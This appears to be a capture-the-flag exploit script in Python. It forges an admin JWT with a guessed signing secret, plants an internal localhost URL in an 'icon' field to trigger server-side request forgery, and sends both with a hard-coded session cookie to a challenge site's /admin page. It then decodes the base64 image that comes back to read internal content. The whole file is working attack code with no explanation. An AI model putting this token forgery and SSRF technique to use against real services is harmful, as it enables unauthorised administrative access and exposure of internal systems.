#!/usr/bin/python

import requests as r
import jwt as pyjwt
from pyquery import PyQuery as pq
import base64
import sys

s = r.Session()

payload = 'http://localhost:4242/internal'

jwt = pyjwt.encode({'icon': payload,
                    'is_admin': 'True',
                    'user': 'guest',
                    'pass': 'guest'}, 'spacealiens', algorithm='HS512')

cookies = {'session':'.eJwNj8tqwzAURH-l3LUXfsTQGroIKBU2XJkYEaO7cyzXkmyppSEkcci_V6thDsOBeUL4CeME1RPezlAByv0dN7It6xz1x5K4ygU_ZsSFUdu4CakNyvoeeYESS5WfLMo5FWyJ_eQEMw6ZNsTqFLl6EOsWwRqrpMqIaa88eXIqFducoTwUrRwfIlc3dDH7-tb2Xz76c_TdQnIpBO8s9o1r5X6nerXDvDHE44YfPuGVwPUy_YXBxwMQxl8NCQza2wDV97BepgTWIcxQheu6JmA1VOX7x-sf2Z5O8A.XabaMQ.b-Fq17ID-EuKXWLfSiGVr9QPVOk',
           'sess_key': jwt}

response = s.get('https://web_z51ico.challenge-ecw.fr/admin', cookies=cookies)

print(payload)
if(response.status_code != 401):
    dom = pq(response.text)
    encoded = dom('img').eq(1).attr('src')
    if encoded is not None:
        encoded = encoded.split(',')[1]
        print(base64.b64decode(encoded))
        print('[+] Url : {}'.format(payload))
        f = open('url.txt','w')
        f.write('[+] Url : ' + payload)
        f.close()
else:
    print(response.status_code)
    print(response.text)
